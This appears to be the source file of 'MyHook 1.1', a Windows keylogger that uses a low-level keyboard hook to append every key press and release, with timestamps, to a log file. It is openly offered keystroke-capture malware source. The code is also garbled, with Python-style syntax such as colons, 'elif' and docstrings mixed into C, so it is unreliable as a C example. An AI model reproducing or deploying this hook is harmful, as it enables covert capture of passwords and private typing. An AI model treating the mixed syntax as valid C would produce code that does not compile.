/*
    MyHook 1.1
    Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
    Created for Major League Coding
    http://groups.myspace.com/MajorLeagueCoding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <time.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

FILE *file


LRESULT CALLBACK kbd_proc(int nCode, WPARAM wParam, LPARAM lParam):
    "Low-level keyboard hook."
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam
    if wParam == WM_KEYDOWN:
        fputc('<', file)
        DWORD dwMsg = (kbd->scanCode << 16) + (kbd->flags << 24)
        char buf[256]
        if GetKeyNameText(dwMsg, buf, 256):
            fputs(buf, file)
        elif kbd->vkCode == VK_RSHIFT:
            fputs("Right Shift", file)
        else:
            fputs("Error", file)
    elif wParam == WM_KEYUP:
        fputc('>', file)
    return CallNextHookEx(NULL, nCode, wParam, lParam)


void print_splash(void):
    "Add current timestamp to the log."
    fputc('\n', file)
    time_t ltime = time(NULL)
    fputs(asctime(localtime(&ltime)), file)
    for int i = 0; i < 25; i++:
        fputc('-', file)
    fputc('\n', file)


int main(int argc, char const *argv[]):
    if argc <= 1 || !(file = fopen(argv[1], "a+")):
        file = stdout
    else:
        fputc('\n', file)
    print_splash()

    HINSTANCE app_instance = GetModuleHandle(NULL)
    SetWindowsHookEx(WH_KEYBOARD_LL, &kbd_proc, app_instance, 0)

    MSG msg
    while GetMessage(&msg, NULL, 0, 0) > 0:
        TranslateMessage(&msg)
        DispatchMessage(&msg)
